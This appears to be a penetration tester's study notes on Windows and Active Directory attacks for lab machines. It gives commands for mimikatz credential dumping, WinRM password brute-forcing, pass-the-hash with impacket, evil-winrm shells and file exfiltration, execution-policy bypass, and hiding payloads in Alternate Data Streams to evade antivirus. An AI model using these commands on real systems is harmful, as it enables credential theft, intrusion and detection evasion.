# Tools / ORDENAR ESTO


## Tips

### Use ExecutionPolicy Bypass: Allows the script to run even if the PowerShell execution policy is restrictive.

```
powershell.exe -ExecutionPolicy Bypass -File C:\Temp\your_script.ps1

powershell -ep bypass
```


rundll32
msiexec







On Windows 11, Network Level Authentication (NLA) is enabled by default for RDP connections.
If the machine is not a domain-joined machine, `rdesktop` won't connect to it.
We can use `xfreerdp` instead, which supports NLA for non domain-joined machines.

- <https://en.wikipedia.org/wiki/Network_Level_Authentication>














## mimikatz
Mimikatz is a hacking tool that extracts Windows authentication credentials from memory, including passwords and hashes. It can then use these credentials to gain unauthorized access, escalate privileges, and perform further attacks.

- <https://adsecurity.org/?page_id=1821>

Commands
```
privilege::debug

sekurlsa::logonpasswords

lsadump::sam


```











## Responder
`sudo responder -I tun0`























## WinRM

Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems over HTTP(S).

Microsoft implemented WinRM in to Windows in order to make life easier for system administrators.

WinRM is typically used in the following ways:
- Remotely access and interact with Windows hosts on a local network.
- Remotely access and execute commands on Windows systems.
- Manage and configure Windows systems remotely.
- WinRM typically uses TCP port 5985 and 5986 (HTTPS).

WinRM implements access control and security for communication between systems through various forms of authentication.

We can utilize a utility called `crackmapexec` to perform a brute-force on WinRM in order to identify users and their passwords as well as execute commands on the target system.



















### crackmapexec

This package is a swiss army knife for pentesting Windows/Active Directory environments.

From enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL's into memory using Powershell, dumping the NTDS.dit and more.



```
crackmapexec [IP]
crackmapexec [IP] --shares -u '' -p ''
crackmapexec [IP] --shares -u 'foobar' -p '' # may fall back to anonymous log in


crackmapexec winrm [IP] -u [USERS FILE] -p [PASSWORD FILE]
crackmapexec winrm [IP] -u administrator -p [PASSWORD FILE]

crackmapexec winrm [IP] -u administrator -p tinkerbell -x "whoami"
crackmapexec winrm [IP] -u administrator -p tinkerbell -x "systeminfo"



# Confirm MachineAccountQuota
crackmapexec ldap 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M MAQ

```



`crackmapexec smb [TARGET] -u maya -p "m4y4ngs4ri" --sam`
...
MB         10.10.11.14     445    MAILING          localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
...







We can also utilize a ruby script called `evil-winrm` to obtain a command shell session on the target system.



### Evil-Winrm
```
evil-winrm -i [TARGET IP] -u [USERNAME] -p [PASSWORD]
evil-winrm -i 10.129.136.91 -u administrator -p badminton


> menu



# Upload and download files
evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD> -s "source" -d "dest"
evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD> -g "source" -d "dest"


# Script execution
evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD> -s "powershell_script.ps1"



# Lateral movement
evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD> -smb <TARGET_IP> -h <HASH>


# Data exfiltration
Compress-Archive -Path "data_directory" -DestinationPath "exfiltrated_data.zip"

evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD> -g "exfiltrated_data.zip" -d "dest"


```










### MSF

exploit/windows/winrm/winrm_script_exec
	set FORCE_VBS true



































## xfreerdp
```
xfreerdp /v:[TARGET IP] /u:[USERNAME] /p:[PASSWORD]
xfreerdp /v:[TARGET IP] /u:[USERNAME] /p:[PASSWORD] /size:80%h

```

You can put all parameters into a text file (i.e. ~/client.rdp with each parameter into single line) to have your favorite configuration stored and quickly accessed:
```
/drive:[NAME],[PATH]
/u:USER_NAME_HERE
/v:CLIENT_IP_HERE
/size:1080x1920
/f
```

Now you can now simply connect each time with:
```
xfreerdp ~/client.rdp
```





















## impacket
- <https://github.com/fortra/impacket>

Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself.



```
impacket-wmiexec localadmin@10.10.11.14 -hashes "aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae"


# Impacket's wmiexec.py can be used to get a shell
impacket-wmiexec [DOMAIN]/[USERNAME]:[PASSWORD]@[IP]
impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.129.208.12




impacket-mssqlclient ARCHETYPE/sql_svc@${ip} -windows-auth
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth

impacket-psexec administrator@${ip}
python3 psexec.py administrator@{TARGET_IP}
# PsExec is a light-weight telnet-replacement that lets you execute processes on other systems
# https://learn.microsoft.com/en-us/sysinternals/downloads/psexec



# add computer

impacket-addcomputer '[DOMAIN]/[USERNAME]' -method [METHOD] -computer-name '[NEW COMPUTER_NAME]' -computer-pass '[NEW COMPUTER_PASSWORD]' -dc-ip [DC_IP_ADDRESS]


impacket-addcomputer 'authority.htb/svc_ldap' -method LDAPS -computer-name 'EVIL01' -computer-pass 'Str0ng3st_P@ssw0rd!' -dc-ip 10.10.11.222

```






















## nc
https://github.com/int0x33/nc.exe/blob/master/nc64.exe
















## winPEAS
winPEASx64.exe
- <https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation>

































###########################################


## Alternate Data Streams (ADS)

Alternate Data Streams (ADS) is an NTFS (New Technology File System) file attribute and was designed to provide compatibility with the MacOS HFS (Hierarchical File System).

Any file created on an NTFS formatted drive will have two different forks/streams:
- Data stream - Default stream that contains the data of the file.
- Resource stream - Typically contains the metadata of the file.

Attackers can use ADS to hide malicious code or executables in legitimate files in order to evade detection.

This can be done by storing the malicious code or executables in the file attribute resource stream (metadata) of a legitimate file.

This technique is usually used to evade basic signature based AVs and static scanning tools.

# Example of hidden file!
```
notepad newFile.txt:hiddenFile.txt
```



# Hide WinPEAS
```

# send the payload to a file with a legitimate name (windowslog.txt)
type WinPEAS.exe > windowslog.txt:winpeas.exe

#if you have the privileges just run the file
start windowslog.txt:winpeas.exe

# another option is create symbolic link in C:\Windows\System32
C:\Windows\System32> mklink wupdate.exe [PATH TO PAYLOAD FILE]
C:\Windows\System32> wupdate


```










## Abusing Windows Library Files

### Obtaining Code Execution via Windows Library Files

Windows library files are virtual containers for user content.
They connect users with data stored in remote locations like web services or shares.
These files have a `.Library-ms` file extension and can be executed by double-clicking them in Windows Explorer.



















